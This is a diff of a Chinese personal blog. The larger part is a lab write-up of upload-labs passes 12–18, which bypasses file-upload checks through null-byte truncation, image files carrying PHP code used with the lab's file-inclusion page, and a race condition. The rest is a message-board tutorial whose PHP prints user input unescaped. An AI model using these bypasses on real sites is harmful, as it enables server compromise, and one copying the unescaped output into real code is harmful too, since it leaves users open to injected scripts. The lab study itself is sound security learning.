+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">截断条件： 1.php版本小于5.3.4 详情关注CVE<span class="string">-2006</span><span class="string">-7243</span> 2.php的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>
+
+<p>php版本更换为5.2.17（phpstudy切换php版本还是挺方便的），高版本应该是 move_uploaded_file 直接返回 false，上传失败</p>
+<p>上传文件名以 jpg 作为扩展名，请求行（重点是查询字符串）如下</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/upload-labs-master/</span>Pass-<span class="number">12</span><span class="regexp">/index.php?save_path=../u</span>pload<span class="regexp">/info.php%00 HTTP/</span><span class="number">1.1</span></span><br></pre></td></tr></table></figure>
+
+<p>漏洞成因可能是php底层好像是用c写的，而c语言字符串以 空字节 / null / 0x00 / \0 作为结束符号，%00 是用url编码来表示 null，拼接成的$img_path 中间有个 null 截断了字符串</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">..upload</span>/<span class="meta">info</span>.php\x00/xxxxxx.jpg</span><br><span class="line">截断后</span><br><span class="line"><span class="symbol">..upload</span>/<span class="meta">info</span>.php  <span class="comment">// 保存的路径</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-13（-00截断-post）"><a href="#pass-13（-00截断-post）" class="headerlink" title="pass-13（%00截断 post）"></a>pass-13（%00截断 post）</h1><p>与pass-12相比只是 get 换成了 post，不能使用 %00</p>
+<p>null 是一个不可打印字符，无法直接从键盘输入，正常写代码时字符串中若需要null往往也是要转义成 \x00</p>
+<p>burpsuite 的 proxy中，抓到包之后，请求行的上面有 raw，hex等，选择hex就能用16进制的值来编辑请求的内容，可以先给一个字符占位 比如</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..<span class="regexp">/upload/</span>phpinfo.phpa</span><br></pre></td></tr></table></figure>
+
+<p>之后找到对应位置，把a（0x61）改为 null（0x00）</p>
+<p>或者右侧的body parameters中可以以其他编码方式转换成想要的内容（比较绕），先输个 %00 然后 burpsuite会给出一个 ‘\0’ ，然后复制他给出的 \0 ，之后再粘贴到想要的地方就 ok 了（感觉不如 hex 直接改）</p>
+<h1 id="pass-14（检查头两个字节，文件头，图片马）"><a href="#pass-14（检查头两个字节，文件头，图片马）" class="headerlink" title="pass-14（检查头两个字节，文件头，图片马）"></a>pass-14（检查头两个字节，文件头，图片马）</h1><p>检查文件头</p>
+<p>jpg、png、gif 等格式，头部都以固定的字节开始</p>
+<p>比如 jpg 是 FF D8 ，根据不同格式接下来两字节 是 FF E0 或 FF E1</p>
+<p>这关根据文件的头两个字节来判断文件类型，并重命名为正确的扩展名</p>
+<p>推荐一个 16进制编辑器 HxD（hex editor），很久之前下的不记得在哪找的了，推荐理由无，主要是用的也不多，可以在一张正常的图片中，插入php代码，这样就可以绕过文件头检测（或者shell中好像有什么命令也可以做到相同的效果）</p>
+<p>但是因为扩展名不是php，所以要配合文件包含利用</p>
+<p>我们将</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>插入图片中，然后上传</p>
+<p>根目录下的 include.php 文件提供了文件包含漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>之前网上看到是说找一张图片把php代码插进去，但我好像刚好找了一张不太行的图片，381行报错了，我甚至不知道怎么找到 381 行。最后试了一下在php代码前面加jpg文件的文件头，可以正常使用，应该就是图片的问题了</p>
+<p>用 ps 自己做一张很小的图片，就没那么容易报错了</p>
+<h1 id="pass-15（getimagesize，图片马）"><a href="#pass-15（getimagesize，图片马）" class="headerlink" title="pass-15（getimagesize，图片马）"></a>pass-15（getimagesize，图片马）</h1><p>两个没怎么见过的函数，描述如下</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">getimagesize(string $filename,<span class="built_in"> array </span>&amp;$imageinfo = ?):<span class="built_in"> array</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line">getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 IMG 标记中的 height/width 文本字符串。</span><br><span class="line"></span><br><span class="line">如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 false 并产生一条 E_WARNING 级的错误。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">image<span class="constructor">_type_to_extension(<span class="params">int</span> $<span class="params">imagetype</span>, <span class="params">bool</span> $<span class="params">include_dot</span> = <span class="params">true</span>)</span>: <span class="built_in">string</span></span><br><span class="line"></span><br><span class="line">根据给定的常量 IMAGETYPE_XXX 返回后缀名。</span><br></pre></td></tr></table></figure>
+
+<p>图片马和之前一样</p>
+<h1 id="pass-16（exif-imagetype-图片）"><a href="#pass-16（exif-imagetype-图片）" class="headerlink" title="pass-16（exif_imagetype 图片）"></a>pass-16（exif_imagetype 图片）</h1><p>需要开启php_exif模块</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">exif_imagetype</span><span class="params">(string <span class="variable">$filename</span>)</span></span>: int</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">exif_imagetype</span><span class="params">()</span></span> 读取一个图像的第一个字节并检查其签名。</span><br><span class="line"></span><br><span class="line">本函数可用来避免调用其它 exif 函数用到了不支持的文件类型上或和 $_SERVER<span class="selector-attr">[<span class="string">&#x27;HTTP_ACCEPT&#x27;</span>]</span> 结合使用来检查浏览器是否可以显示某个指定的图像。</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-17（二次渲染-imagecreatefromjpeg）"><a href="#pass-17（二次渲染-imagecreatefromjpeg）" class="headerlink" title="pass-17（二次渲染 imagecreatefromjpeg）"></a>pass-17（二次渲染 imagecreatefromjpeg）</h1><p>上传后重新生成图像</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">imagecreatefromjpeg</span><span class="params">(string <span class="variable">$filename</span>)</span></span>: resource</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">imagecreatefromjpeg</span><span class="params">()</span></span> 返回一图像标识符，代表了从给定的文件名取得的图像。</span><br></pre></td></tr></table></figure>
+
+
+
+<p>网上说 gif 的比较好做，只要把上传后的图片再下载回来，然后和之前的对比，把代码插到没有改变的部分就行</p>
+<p>jpg和png比较难搞好像，我不太了解这些格式，寄（网上有脚本）</p>
+<h1 id="pass-18（条件竞争）"><a href="#pass-18（条件竞争）" class="headerlink" title="pass-18（条件竞争）"></a>pass-18（条件竞争）</h1><p>文件上传相关代码，关键点在于，无论是否合法，先保存文件（不改名），如果非法，则删除文件，合法则改名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>假设我们同时做两件事，1、上传exp.php文件，2、访问上传的exp.php。服务器是并发处理这两个请求的，存在一种很巧合的情况，上传文件这条线处理到保存了文件但还没执行到unlink删除非法文件，这时服务器cpu转而去处理访问exp.php那条线，这样就成功访问到服务器上的exp.php了。这种情况发生的概率并不是100%，需要多次尝试。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/01/27/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -171,10 +434,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-01-27 17:37:57 / 修改时间：19:05:08" itemprop="dateCreated datePublished" datetime="2022-01-27T17:37:57+08:00">2022-01-27</time>
+              <time title="创建时间：2022-01-27 17:37:57" itemprop="dateCreated datePublished" datetime="2022-01-27T17:37:57+08:00">2022-01-27</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-22 23:49:34" itemprop="dateModified" datetime="2022-04-22T23:49:34+08:00">2022-04-22</time>
+              </span>
 
           
 
@@ -247,7 +516,7 @@
 
 
 <p>至此，基本功能差不多实现了，效果如下</p>
-<p><img src="/images/13.png"></p>
+<p><img src="/images/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/13.png"></p>
 <h1 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h1><p>这界面并不美观，而且没有分页功能</p>
 <p>所以再优化一下</p>
 <p>不会 css ，所以用 bootstrap 5 降低一点难度</p>
@@ -265,15 +534,15 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=edge&quot;</span> /&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span> /&gt;</span><br><span class="line">    &lt;title&gt;一个简单的留言板&lt;/title&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;../bootstrap-5.1.3-dist/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> /&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;../bootstrap-5.1.3-dist/js/bootstrap.bundle.min.js&quot;</span> defer=<span class="string">&quot;defer&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">require_once</span> <span class="string">&quot;./db.php&quot;</span>; <span class="meta">?&gt;</span></span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-6&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">floating</span> <span class="title">container</span> <span class="title">my</span>-5 <span class="title">bg</span>-<span class="title">warning</span> <span class="title">py</span>-5 <span class="title">border</span> <span class="title">rounded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">form</span> <span class="title">action</span>=&quot;./<span class="title">submit</span>.<span class="title">php</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3 <span class="title">col</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">lable</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">label</span> <span class="title">fw</span>-<span class="title">bold</span>&quot;&gt;<span class="title">Name</span>&lt;/<span class="title">lable</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">name</span>=&quot;<span class="title">name</span>&quot; <span class="title">autocomplete</span>=&quot;<span class="title">on</span>&quot; <span class="title">required</span>=&quot;<span class="title">required</span>&quot; <span class="title">placeholder</span>=&quot;你的名字&quot; /&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">row</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">mb</span>-3 <span class="title">col</span>-8&quot;&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">lable</span> <span class="title">class</span>=&quot;<span class="title">from</span>-<span class="title">lable</span> <span class="title">fw</span>-<span class="title">bold</span>&quot;&gt;<span class="title">Message</span>&lt;/<span class="title">lable</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">textarea</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">name</span>=&quot;<span class="title">msg</span>&quot; <span class="title">placeholder</span>=&quot;说点什么吧&quot; <span class="title">required</span>=&quot;<span class="title">required</span>&quot; <span class="title">style</span>=&quot;<span class="title">height</span>: 200<span class="title">px</span>&quot;&gt;&lt;/<span class="title">textarea</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">button</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span>-<span class="title">lg</span> <span class="title">btn</span>-<span class="title">primary</span>&quot;&gt;<span class="title">Submit</span>&lt;/<span class="title">button</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            &lt;<span class="title">h1</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">center</span> <span class="title">fw</span>-<span class="title">bold</span>&quot;&gt;最新留言&lt;/<span class="title">h1</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">container</span> <span class="title">py</span>-3 <span class="title">border</span> <span class="title">mb</span>-5 <span class="title">border</span>-<span class="title">warning</span> <span class="title">border</span>-3 <span class="title">rounded</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                $<span class="title">comments</span> = $<span class="title">db</span>-&gt;<span class="title">query</span>(&quot;<span class="title">select</span> `<span class="title">name</span>`, `<span class="title">msg</span>`, `<span class="title">date</span>` <span class="title">from</span> <span class="title">comments</span> <span class="title">order</span> <span class="title">by</span> `<span class="title">id</span>` <span class="title">desc</span> <span class="title">limit</span> 0, 5&quot;);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                <span class="title">if</span> ($<span class="title">comments</span>) </span>&#123;</span><br><span class="line">                    <span class="keyword">foreach</span> (<span class="variable">$comments</span> <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line">                        &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">table</span>-<span class="title">striped</span>&quot; <span class="title">style</span>=&quot;<span class="title">word</span>-<span class="title">break</span>:<span class="title">break</span>-<span class="title">all</span>; <span class="title">word</span>-<span class="title">wrap</span>:<span class="title">break</span>-<span class="title">all</span>;&quot;&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">font</span>-<span class="title">monospace</span> <span class="title">fw</span>-<span class="title">light</span> <span class="title">fst</span>-<span class="title">italic</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">date</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">fs</span>-1 <span class="title">fw</span>-<span class="title">normal</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">name</span>&#x27;] ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">                            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">bg</span>-<span class="title">info</span> <span class="title">rounded</span> <span class="title">fs</span>-5 <span class="title">col</span>-12&quot;&gt;</span></span><br><span class="line"><span class="class">                                        &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">row</span>[&#x27;<span class="title">msg</span>&#x27;] ?&gt;</span></span><br><span class="line"><span class="class">                            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">                        &lt;<span class="title">hr</span> /&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">                    &#125;</span></span><br><span class="line"><span class="class">                &#125;</span></span><br><span class="line"><span class="class">                ?&gt;</span></span><br><span class="line"><span class="class">                &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">end</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">a</span> <span class="title">class</span>=&quot;<span class="title">col</span>-2 <span class="title">text</span>-<span class="title">light</span> <span class="title">btn</span>-<span class="title">primary</span> <span class="title">btn</span>-<span class="title">lg</span> <span class="title">text</span>-<span class="title">center</span>&quot;</span></span><br><span class="line"><span class="class">                        <span class="title">style</span>=&quot;<span class="title">text</span>-<span class="title">decoration</span>: <span class="title">none</span>;&quot; </span></span><br><span class="line"><span class="class">                        <span class="title">href</span>=&quot;./<span class="title">more</span>.<span class="title">php</span>?<span class="title">page</span>=1&quot;&gt;<span class="title">more</span></span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">col</span>-<span class="title">md</span>-3&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>效果如下</p>
-<p><img src="/images/14.png"></p>
-<p><img src="/images/15.png"></p>
+<p><img src="/images/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/14.png"></p>
+<p><img src="/images/%E7%94%A8php%E5%86%99%E4%B8%80%E4%B8%AA%E7%AE%80%E6%98%93%E7%95%99%E8%A8%80%E6%9D%BF/15.png"></p>
 <p>bootstrap中提供了一些功能，让网页变为响应式的，也就是随着页面的大小自动调整一些样式</p>
 <h1 id="more-php"><a href="#more-php" class="headerlink" title="more.php"></a>more.php</h1><p>实现分页功能，就注意一下边界</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span 